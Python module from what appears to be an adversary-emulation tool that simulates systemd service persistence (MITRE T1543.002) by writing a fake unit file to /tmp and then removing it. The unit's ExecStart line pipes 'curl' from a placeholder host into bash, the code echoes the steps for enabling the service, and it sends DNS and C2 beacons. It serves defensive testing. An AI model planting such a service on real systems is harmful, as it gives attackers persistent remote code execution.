# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Attack: service_persistence — Persistence (TA0003)
T1543     Create or Modify System Process
T1543.002 Create or Modify System Process: Systemd Service

SAFE simulation: writes a realistic-looking fake systemd service unit file.
The unit is written to /tmp (not /etc/systemd/system) so it cannot actually
be enabled or started. The cleanup step removes it immediately.
"""

from __future__ import annotations

from typing import Any

from gloamfire.attacks.base import AttackResult, BaseAttack
from gloamfire.core.registry import register

_DNS_BEACON_DOMAIN = "svcpersist-sim.gloamfire.invalid"
_SERVICE_FILE = "/tmp/gloamfire-updater.service"


@register
class ServicePersistenceAttack(BaseAttack):
    name = "service_persistence"
    description = "Simulate systemd service persistence — write fake .service unit file (T1543, T1543.002)"
    mitre = ["T1543", "T1543.002"]

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        service_file = params.get("service_file", _SERVICE_FILE)
        resolver = params.get("resolver", "8.8.8.8")

        # A real attacker would write to /etc/systemd/system/ — we write to /tmp
        script = f"""
echo "[Gloamfire] Systemd service persistence simulation starting"

# T1543.002 — write fake service unit (to /tmp, NOT /etc/systemd/system)
cat > {service_file} << 'EOF'
[Unit]
Description=System Update Helper
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'curl -s http://192.0.2.1/update | bash'
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOF

echo "[Gloamfire] Fake service unit written to {service_file}"
cat {service_file}

# Show what a real attacker would do (not actually run)
echo "[Gloamfire] NOTE: real attack would run:"
echo "  cp {service_file} /etc/systemd/system/"
echo "  systemctl daemon-reload && systemctl enable gloamfire-updater"
echo "[Gloamfire] SIMULATION: not copying to /etc/systemd/system/"
echo "[Gloamfire] Systemd service persistence simulation complete"
"""
        result = self._exec(target, script)
        result.metadata["service_file"] = service_file

        self._exec(target, f"nslookup {_DNS_BEACON_DOMAIN} {resolver} 2>/dev/null || true")
        self._c2_beacon(target)
        self._write_attack_log(target, self.name)
        return result


@register
class ServicePersistenceCleanup(BaseAttack):
    name = "service_persistence_cleanup"
    description = "Remove fake systemd service unit file"
    mitre = []

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        service_file = params.get("service_file", _SERVICE_FILE)
        return self._exec(target, f"rm -f {service_file}")
